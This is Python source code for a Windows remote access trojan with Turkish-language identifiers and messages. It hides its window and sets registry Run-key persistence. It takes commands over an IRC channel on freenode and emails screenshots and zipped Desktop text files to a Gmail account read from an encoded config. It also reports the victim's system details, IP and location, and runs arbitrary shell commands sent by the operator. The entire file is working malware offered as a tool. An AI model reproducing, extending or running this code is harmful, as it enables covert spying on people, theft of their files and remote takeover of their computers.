import socket
import platform
import os
from yagmail import SMTP as mail
from requests import get as request
from subprocess import getoutput as cmd_bilgi,call as cmd_cagir
import zipfile, re
from desktopmagic.screengrab_win32 import getScreenAsImage
import win32gui, win32con
import xml.etree.ElementTree as xml
import base64
arkaplandacalistir = win32gui.GetForegroundWindow()
win32gui.ShowWindow(arkaplandacalistir, win32con.SW_HIDE)
RegQuery = os.system("reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v 1")
os.system("cls")
if str(RegQuery) == "1":
    os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v 1 /t REG_SZ /d " + __file__)
xml_file = xml.parse("data.xml")
root = xml_file.getroot()
GMAIL = ""
GMAIL_PASS = ""
KANAL = ""
BOTNICK = os.environ["USERNAME"]

for i in root.findall("datas"):
    email = i.find("A1").text
    password = i.find("A2").text
    channel = i.find("A3").text
    if email != "" and password != "" and channel != "":
        GMAIL = base64.b64decode(email).decode()
        GMAIL_PASS = base64.b64decode(password).decode()
        KANAL = base64.b64decode(channel).decode()


class Rat:

    def __init__(self):
        self.SERVER = "irc.freenode.net"
        self.KANAL = KANAL
        self.IRCSOCK = socket.socket()
        self.IRCSOCK.connect((self.SERVER, 6667))
        self.ircmsg = ""
        self.gmail = mail(GMAIL, GMAIL_PASS)

        self.IRCSOCK.send(bytes("USER " + BOTNICK + " " + BOTNICK + " " + BOTNICK + " " + BOTNICK + "\n", "UTF-8"))
        self.IRCSOCK.send(bytes("NICK " + BOTNICK + "\n", "UTF-8"))
        self.IRCSOCK.send(bytes("JOIN " + self.KANAL + "\n", "UTF-8"))

    def sendmsg(self, msg):
        self.IRCSOCK.send(bytes("PRIVMSG " + self.KANAL +" :" + msg + "\n", "UTF-8"))

    def getsys(self):
        self.sendmsg(f"{BOTNICK}'in Kullanıcı Adı = {os.environ['USERNAME']} | İşletim Sistemi = {platform.platform()} | İşletim Sistemi Versiyonu = {platform.version()}"
            f"| İşlemci Modeli = {platform.processor()} İşlemci Bit = {platform.machine()} | Cpu Sayısı = {os.cpu_count()} | Ağ Adı = {platform.node()}")

    def getscreenshot(self):
        screenshot = getScreenAsImage()
        screenshot.save("screenshot.png", format="png")
        self.gmail.send(to=GMAIL, subject=BOTNICK + "'ın ScreenShot'u", attachments="screenshot.png")
        self.sendmsg(f"{GMAIL} Adresine {BOTNICK}'ın ScreenShot'u Gönderilmiştir!")
        os.remove("screenshot.png")

    def getipinfo(self):
        cmd_getmac = cmd_bilgi("getmac")
        get_mac = re.findall("([0-9].*?) ", cmd_getmac)

        req = request("http://httpbin.org/ip")
        if req.status_code == 200:
            self.get_ip = re.findall('": "(.*?)"', req.text)
        else:
            self.sendmsg("Şuan Ip Adresimi Gönderemiyorum Lütfen Daha Sonra Deneyin.")

        req = request("https://whatismyipaddress.com/ip/" + self.get_ip[0])

        if req.status_code == 200:
            get_city = re.findall("<tr><th>City:</th><td>(.*?)</td></tr>", req.text)
            get_country = re.findall("tr><th>Country:</th><td>(.*?)<img", req.text)
            get_continent = re.findall("<tr><th>Continent:</th><td>(.*?)</td>", req.text)
            get_postalcode = re.findall("<tr><th>Postal Code:</th><td>(.*?)</td>", req.text)
            self.sendmsg(f"Ip Adresi= {self.get_ip[0]} | Mac Adresi= {get_mac[0]} | Kıta= {get_continent[0]} | "
                f"Ulke= {get_country[0]}| Şehir= {get_city[0]} | Posta Kodu= {get_postalcode[0]}")

        else:
            self.sendmsg("Şuan Ip Bilgilerimi Gönderemiyorum Lütfen Daha Sonra Deneyin.")
            self.sendmsg(f"İp Adresim= {self.get_ip[0]}")

    def gettxtfile(self):
        os.chdir(os.path.expanduser("~") + "\\Desktop")
        zip_txt = zipfile.ZipFile("txt.zip", mode="w")
        for folder_path, sub_folders, files in os.walk(os.getcwd()):
            for file in files:
                if file.endswith(".txt"):
                    zip_txt.write(os.path.abspath(folder_path) + "\\" + file)
        zip_txt.close()
        self.gmail.send(to=GMAIL, subject=BOTNICK + "'ın Txt Dosyaları", attachments="txt.zip")
        os.remove("txt.zip")
        self.sendmsg(f"Txt Dosyaları {GMAIL} Adresine Gönderilmiştir!")

    def main(self):
        while 1:
            ircmsg = self.IRCSOCK.recv(2048).decode("UTF-8")
            ircmsg = ircmsg.strip('\n\r')
            print(ircmsg)
            if "End of /NAMES list" in ircmsg:
                break
        while 1:
            ircmsg=self.IRCSOCK.recv(2048).decode("UTF-8")
            if "get sys " + BOTNICK in ircmsg:
                self.getsys()
            elif "get user " + BOTNICK in ircmsg:
                self.sendmsg(str(os.environ["USERNAME"]))
            elif "get ss " + BOTNICK in ircmsg or "get screenshot " + BOTNICK in ircmsg:
                self.getscreenshot()
            elif "get   USERS" in ircmsg:
                self.sendmsg(BOTNICK)
            elif "get txt file " + BOTNICK in ircmsg:
                self.gettxtfile()
            elif "ip info " + BOTNICK in ircmsg:
                self.getipinfo()
            elif "quit " + BOTNICK in ircmsg:
                self.sendmsg("Program Kapatıldı :)")
                exit()
            elif "cmd" and BOTNICK  in ircmsg:
                cmd_code=ircmsg.replace("cmd ","").replace(BOTNICK,"")
                cmd_cagir(cmd_code.split(":")[2], shell=True)
            else:
                self.sendmsg("Bilinmeyen Komut...")
                continue
Rat().main()
